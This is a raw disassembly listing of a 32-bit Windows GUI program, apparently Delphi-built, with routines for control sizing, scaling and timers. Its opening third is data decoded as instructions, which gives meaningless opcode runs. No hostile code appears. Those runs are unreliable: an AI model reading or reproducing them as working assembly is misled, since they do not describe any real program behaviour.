or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
rol [ gs : eax ] 0x45
adc [ eax ] al
test al 0x1
add bh bh
and al 0xaf
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
cmp al 0xd5
inc ebp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
sbb al 0xc5
inc ebp
add [ ebp + eax * 8 + 0x10045 ] bl
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
call sub_4399ac
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x9c656c62
push cs
inc ebp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jb r-xdata
insb
pop ecx
inc ebp
add al cl
jpe r-xdata
jo r-xdata
adc [ eax ] al
0xc0ff0000 0x455b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc [ ebp + eax * 2 ] bl
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
xor [ eax ] 0x0
jpe r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
push [ ebp + eax * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
lds eax [ ebp ]
pushfd
lds eax [ ebp ]
add [ eax ] eax
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0xf0ff0001
les eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
[ ecx + ebx * 2 + 0x45 ]
adc [ eax ] al
cdq
add [ eax ] al
[ ebx + ebx * 2 + 0x5b640045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
sub [ eax ] 0x0
inc ebp
add [ ecx ] al
dec edi
inc esi
add [ eax + eax ] bh
inc [ edx + ebx * 2 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
pop edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
call 0xffffffffe9425512
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
pop esp
or eax [ ebp ]
push eax
outsd
jo r-xdata
pop es
inc ebp
add [ eax * 8 - 0x3a63ffbb ] bl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec edi
outsb
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc edi
je r-xdata
add [ eax + 0x4f070038 ] al
pop edi
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
jo r-xdata
or eax 0x1000045
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
dec edi
outsb
push ebx
inc esp
outsd
ja r-xdata
add [ eax ] 0x0
pop edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4 ] bp
or al 0x45
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x45
add [ eax ] cl
jo r-xdata
dec ebp
outsd
jne r-xdata
imul esi [ ebp + 0x49 ] 0x706f666e
or [ ebp ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
imul esp [ ebx + 0x6b ] r-xdata
insb
inc ebx
insb
inc esp
jb r-xdata
or al [ ebp ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
xor [ ebx ] 0x0
or cl [ edi + 0x6e ]
or al 0x45
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
clc
jb r-xdata
call 0xffffffffd8439b3a
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
dec ebp
inc ebp
add al ah
add [ eax ] al
jmp eax
jo r-xdata
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
inc esp
outsd
arpl [ ebx - 0x44 ] bp
or eax [ ebp ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
push cs
inc ebp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
or eax 0x1f00045
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
push ebp
jo r-xdata
or al 0x45
add [ eax - 0x4700ffff ] bh
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
je r-xdata
outsd
jne r-xdata
add [ eax ] al
cmp [ 0x6e4f0900 ] 0x4d
pop edi
inc ecx
add al bh
add [ eax ] al
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
pop eax
sub_435708
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_424c94
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_4253e0
pop ebx
mov esp ebp
pop ebp
retn
sub_4357cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_424da0
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_435708
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_43582c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45d584
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42776c
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_435c70
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_403400
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_45522c
mov edx 0x69
mov eax ebx
call sub_455208
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4358c4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45d5e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_435910
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_427dd8
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_427df0
mov edi eax
mov eax ebx
call sub_455450
mov [ esp ] eax
mov eax ebx
call sub_455494
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_4029fc
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_4029fc
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_4029fc
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_4029fc
mov esi eax
jmp r-xdata
sub_435a3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_435aed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_435910
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_425460
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435af4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_424d70
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_425090
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_425418
sub_435afc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_46cc58
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_45c684
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_45c380
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_456c00
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_435b94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_435afc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_435c70
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_427dd8
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_427df0
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_435910
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_427dd8
push eax
mov eax [ ebx + 0x168 ]
call sub_427df0
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_435afc
test al al
je r-xdata
sub_435d98
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_427dd8
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_427dd8
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_427df0
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_427df0
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_435e00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212ec
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_435e88
call sub_422438
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_435e50
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_435efc
mov eax [ esi + 0x34 ]
call sub_4224ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421338
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_435e88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_435ec2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435efc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_435f7b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435f82
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
sub_435fd4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45e004
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_44ae1c
call sub_44aefc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403550
mov edx 0xb9
mov eax esi
call sub_455208
mov edx 0x29
mov eax esi
call sub_45522c
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_436424
mov edx 0x1
mov eax esi
call sub_436440
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_455bec
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_45c614
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_436098
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4591d4
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_436108
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45b960
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_4598e8
sub_436148
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436238
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_455a4c
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_45a824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43623f
lea eax [ ebp - 0x14 ]
call sub_403f7c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
